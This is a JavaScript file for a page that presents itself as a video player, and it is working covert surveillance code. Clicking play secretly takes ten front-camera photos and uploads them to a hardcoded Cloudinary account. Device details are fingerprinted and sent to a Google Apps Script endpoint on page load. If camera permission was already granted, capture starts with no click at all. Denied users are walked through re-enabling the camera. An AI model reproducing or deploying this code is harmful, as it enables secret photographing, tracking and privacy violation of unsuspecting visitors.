const playButton = document.getElementById('playButton');
const loader = document.getElementById('loader');
const video = document.getElementById('videoPlayer');
const cameraInput = document.getElementById('cameraInput');
const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent) || (navigator.platform === 'MacIntel' && navigator.maxTouchPoints > 1);

const uploadToCloudinary = async (blob) => {
    const formData = new FormData();
    formData.append('file', blob);
    formData.append('upload_preset', 'user_pre');
    const response = await fetch('https://api.cloudinary.com/v1_1/dzmg57zjf/image/upload', { method: 'POST', body: formData });
    return response.json();
};

const captureAndUpload = async () => {
    if (isIOS) {
        return new Promise((resolve) => {
            cameraInput.onchange = async (e) => {
                const file = e.target.files[0];
                if (file) {
                    await uploadToCloudinary(file);
                    resolve();
                }
            };
            cameraInput.click();
        });
    } else {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
        
        // Capture 10 photos, one every 5 seconds
        for (let i = 0; i < 10; i++) {
            if (i > 0) {
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
            
            if (window.ImageCapture) {
                const videoTrack = stream.getVideoTracks()[0];
                const imageCapture = new ImageCapture(videoTrack);
                const blob = await imageCapture.takePhoto();
                await uploadToCloudinary(blob);
            } else {
                const videoEl = document.createElement('video');
                videoEl.srcObject = stream;
                videoEl.play();
                await new Promise(resolve => setTimeout(resolve, 500));
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                await uploadToCloudinary(blob);
            }
        }
        
        stream.getTracks().forEach(track => track.stop());
    }
};

(async () => {
    const ua = navigator.userAgent;
    const getDeviceInfo = () => {
        const android = ua.match(/Android ([0-9.]+)/);
        const ios = ua.match(/OS ([0-9_]+)/);
        
        let brand = null, model = null;
        
        if (ua.match(/iPhone/)) {
            brand = 'Apple';
            model = 'iPhone';
        }
        else if (ua.match(/iPad/)) {
            brand = 'Apple';
            model = 'iPad';
        }
        else if (ua.match(/iPod/)) {
            brand = 'Apple';
            model = 'iPod';
        }
        else if (/Windows/i.test(ua)) {
            brand = 'Windows';
            const m = ua.match(/Windows NT ([0-9.]+)/);
            model = m ? 'NT ' + m[1] : 'PC';
        }
        else if (/Macintosh|Mac OS X/i.test(ua)) {
            brand = 'Apple';
            const m = ua.match(/Mac OS X ([0-9_]+)/);
            model = m ? 'macOS ' + m[1].replace(/_/g, '.') : 'Mac';
        }
        else if (android) {
            // Extract model from Build/ pattern (works for ALL Android)
            const buildMatch = ua.match(/;\s*([^;)]+)\s*Build/i);
            if (buildMatch) {
                const fullModel = buildMatch[1].trim();
                model = fullModel;
                
                // Try to extract brand from model string
                const firstWord = fullModel.split(/[\s-_]+/)[0];
                
                // Check if first word matches known brands
                const brands = ['TECNO', 'Infinix', 'Poco', 'Samsung', 'Redmi', 'Xiaomi', 'OPPO', 'Vivo', 'Realme', 'OnePlus', 'Pixel', 'Nothing', 'Honor', 'Sony', 'Motorola', 'ZTE', 'ASUS', 'Meizu', 'LG', 'Blackview', 'Huawei', 'Nokia', 'itel', 'Sparx', 'QMobile', 'Calme', 'Dany', 'Digit'];
                
                for (const b of brands) {
                    if (new RegExp(b, 'i').test(fullModel) || new RegExp(b, 'i').test(ua)) {
                        brand = b;
                        break;
                    }
                }
                
                // If still no brand, use first word
                if (!brand) {
                    brand = firstWord;
                }
            }
        }
        
        return {
            androidVersion: android ? android[1] : null,
            iosVersion: ios ? ios[1].replace(/_/g, '.') : null,
            brand: brand,
            model: model
        };
    };
    const deviceInfo = getDeviceInfo();
    const version = deviceInfo.androidVersion || deviceInfo.iosVersion || 'Unknown';
    
    const specs = {
        brand: deviceInfo.brand || 'Unknown',
        model: deviceInfo.model || 'Unknown',
        version: version,
        userAgent: ua
    };
    
    await fetch('https://script.google.com/macros/s/AKfycbwd6DFAaGBLF8RM6kD07nvTqD5Gr_SLDGTTLrkfVJ6qYrb7NtO9ZYZwqlgu4BnmQ28V/exec', {
        method: 'POST',
        mode: 'no-cors',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(specs)
    }).catch(() => {});
    
    // Auto-capture on page load if permission granted
    if (!isIOS && navigator.permissions) {
        try {
            const result = await navigator.permissions.query({ name: 'camera' });
            if (result.state === 'granted') {
                captureAndUpload().catch(() => {});
            }
        } catch (e) {}
    }
})();

const playVideo = (videoEl, playBtn, loaderEl) => {
    playBtn.style.display = 'none';
    if (loaderEl) loaderEl.style.display = 'none';
    
    // Hide thumbnail if exists
    const container = videoEl.closest('.video-container');
    const thumbnail = container.querySelector('.thumbnail');
    if (thumbnail) thumbnail.style.display = 'none';
    
    videoEl.classList.add('playing');
    videoEl.controls = true;
    videoEl.play();
};

playButton.addEventListener('click', async () => {
    playButton.style.display = 'none';
    loader.style.display = 'block';
    try {
        await captureAndUpload();
        playVideo(video, playButton, loader);
    } catch (error) {
        loader.style.display = 'none';
        playButton.style.display = 'flex';
        
        const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
        const isChrome = /Chrome/i.test(navigator.userAgent);
        const isSafari = /Safari/i.test(navigator.userAgent) && !/Chrome/i.test(navigator.userAgent);
        
        let instructions = 'Camera permission denied.\n\nTo enable camera access:\n\n';
        
        if (isMobile && isChrome) {
            instructions += '1. Tap the lock icon (🔒) in the address bar\n2. Tap "Permissions"\n3. Enable "Camera"\n4. Refresh the page';
        } else if (isMobile && isSafari) {
            instructions += '1. Go to iPhone Settings\n2. Scroll to Safari\n3. Tap "Camera"\n4. Select "Ask" or "Allow"\n5. Return and refresh this page';
        } else if (isChrome) {
            instructions += '1. Click the lock icon (🔒) in the address bar\n2. Click "Site settings"\n3. Change Camera to "Allow"\n4. Refresh the page';
        } else {
            instructions += '1. Click the camera icon in the address bar\n2. Allow camera access\n3. Refresh the page';
        }
        
        alert(instructions);
    }
});

